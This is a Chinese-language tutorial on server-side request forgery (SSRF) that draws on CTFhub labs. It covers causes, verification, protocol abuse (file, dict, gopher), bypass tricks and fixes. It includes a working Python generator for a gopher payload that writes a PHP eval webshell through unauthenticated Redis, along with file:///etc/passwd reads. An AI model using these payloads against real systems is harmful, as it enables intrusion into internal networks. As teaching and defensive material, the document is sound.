### 0x00 漏洞简介

服务端请求伪造，由攻击者构造的由服务端发起请求的一种漏洞，目标一般是内网系统。

### 0x01 漏洞成因

##### 1、本质

服务端在提供访问其他服务器数据时，未对数据进行过滤和限制。

##### **2、产生漏洞函数**

php中：

- file_get_contents()：将整个文件读入一个字符串中
- fsockopen()
- curl_exec()：执行给定的curl会话

##### **3、漏洞场景**

关键：通过url地址调用

- 分享：通过url地址分享网页内容
- 转码服务：通过url地址把原地址网页内容显示调优
- 在线翻译：通过url地址翻译对应文本
- 图片加载与下载功能：通过指定url地址加载或下载图片
- 图片、文章收藏功能：从分享的url读取原文标题等
- 未公开的api实现及其他调用url的功能

##### **4、漏洞分类**

有回显SSRF：显示对攻击者的响应

无回显SSRF：不会返回给客户端，可借助dnslog

##### **5、常见url关键字**

share、wap、link、url、src、source、target、u、sourceurl、imageurl、domain等

##### 6、内网IP段

```
C类：192.168.0.0 - 192.168.255.255 
B类：172.16.0.0 - 172.31.255.255 
A类：10.0.0.0 - 10.255.255.255
```

### 0x02 漏洞验证(具体点)

验证是否为服务器发生的请求：

##### 1、F12查看源代码

查看是否在本地进行了请求，如src="http://xxx.com/1.php?img="。

##### 2、借助dnslog和ceye.io，看是否被访问

##### 3、抓包分析是否由服务器发生



### 0x03 漏洞利用

- 对内网进行端口扫描，信息探测，指纹识别
- 攻击内网Web应用（Redis\Mysql）
- 读取内网敏感文件

##### 1、file协议

```
file:///etc/passwd
```



##### 2、dict协议

 字典服务器协议 ，获取配置信息。

```
dict://127.0.0.1:端口/info
```


##### 3、gopher协议

利用此协议可以攻击内网的 `FTP、Telnet、Redis、Memcache`应用，也可以进行 `GET、POST` 请求。 

##### 4、curl命令

使用`-v`参数会返回执行结果。

eg：

```
curl -v “file:///etc/passwd”
```

### 0x04 攻击应用

##### 1、攻击fastcgi协议

参考：https://mp.weixin.qq.com/s/6yJENaIHTHk5YzZarKZ2ew

##### 2、攻击redis服务

（1）利用gopher协议

实验来源：ctfhub

利用ssrf对目标主机的redis进行未授权访问攻击，通过dict协议可知redis服务使用默认端口6379。

redis未授权利用方法有几种，这里使用写webshell的方法。

构造redis利用命令：

```
quan 1 '<?php eval($_POST["whoami"]);?>'config set dir /var/www/htmlconfig set dbfilename shell.phpsave
```

转换成gopher格式的python脚本：

```python
import urllib.parse

protocol = "gopher://"
ip = "127.0.0.1"
port = "6379"
shell = "\n\n<?php eval($_POST[\"quan\"]);?>\n\n"
filename = "1.php"
path = "/var/www/html"
passwd = ""
cmd = ["quan",
     "set 1 {}".format(shell.replace(" ","${IFS}")),  
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save",
     "quit"
    ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload = protocol + ip + ":" + port + "/_"
def redis_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*" + str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF + "$" + str(len((x.replace("${IFS}"," ")))) + CRLF + x.replace("${IFS}"," ")
    cmd += CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))

    # print(payload)
    print(urllib.parse.quote(payload))
```

再利用python脚本将它转换成符合gopher协议的payload：



访问该payload，url=gopher~~

此时已经在web目录下写了1.php。



在根目录找到flag。



（2）weblogic ssrf

下载地址：https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf
 编译并启动环境

```
docker-compose build
docker-compose up -d
```

SSRF漏洞存在于`http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp`

参考：https://xz.aliyun.com/t/7405#toc-3

### 0x05 漏洞绕过

实验：ctfhub

##### 1、IP地址进制的转换

转换成八进制、十六进制等。

如127.0.0.1的十六进制、十进制、二进制分别为：

```
十六进制 = 7F000001
十进制 = 2130706433
二进制 = 1111111000000000000000000000001 
```

则payload：?url=http://2130706433/flag.php，可绕过对127.0.0.1的检测。

##### 2、利用url解析问题

@#

eg：url=http://notfound.ctfhub.com@127.0.0.1/flag.php

##### 3、利用302跳转

利用xip.io重定向

##### 4、利用非HTTP协议（gophar、dict、file等）

##### 5、DNS重绑定

将A地址绑定到B地址上，需多次访问

https://lock.cmpxchg8b.com/rebinder.html

##### 6、限制了子网段，可以加:80端口绕过



### 0x06 漏洞修复

##### 1、过滤请求协议，只允许http/https

##### 2、限制访问内网，IP白名单

##### 3、限制端口仅为web端口

##### 4、统一错误信息

##### 5、禁止跳转

##### 6、对于dns rebinding，考虑使用dns缓存或host白名单
